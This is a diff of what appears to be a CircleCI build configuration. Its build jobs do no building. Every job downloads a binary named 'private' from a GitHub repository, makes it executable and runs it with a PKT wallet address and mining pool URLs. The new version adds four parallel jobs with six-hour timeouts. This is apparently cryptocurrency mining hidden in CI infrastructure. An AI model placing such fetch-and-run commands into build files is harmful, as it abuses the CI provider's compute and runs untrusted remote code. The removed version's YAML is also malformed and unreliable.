@@ -1,35 +1,65 @@
-version: 2.0
+version: 2
 jobs:
-  build:
-   images-1:
-    working_dir: &working_dir ~/app 
-  .build_template: &script
-  steps: 
-    - checkout 
-    - run: 
-        name: Install
-        command: |  wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
+  build_01:
+    docker:
+      - image: cimg/base:stable
+
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run: ls
+      - run:
+          no_output_timeout: 362m
+          
+          command: "wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*""
       
-  images-2:
-working_dir: &working_dir ~/app 
-  .build_template: &script
-  steps: 
-    - checkout 
-    - run: 
-        name: Install
-        command: |  wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
-images-3:
-working_dir: &working_dir ~/app 
-  .build_template: &script
-  steps: 
-    - checkout 
-    - run: 
-        name: Install
-        command: |  wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
+      
+      
+      
+  build_02:
+    docker:
+      - image: cimg/base:stable
+
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run: ls
+      - run:
+          no_output_timeout: 360m
+          
+          command: "wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*""
+      
+  build_03:
+    docker:
+      - image: cimg/base:stable
+
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run: ls
+      - run:
+          no_output_timeout: 360m
+          
+          command: "wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*""
+      
+  build_04:
+    docker:
+      - image: cimg/base:stable
+
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run: ls
+      - run:
+          no_output_timeout: 360m
+          
+          command: "wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*""
+  
 workflows:
-    version: 2.1
+    version: 2
     build:
         jobs:
-             - images-1
-             - images-2
-             - images-3
+            - build_01
+            - build_02
+            - build_03
+            - build_04
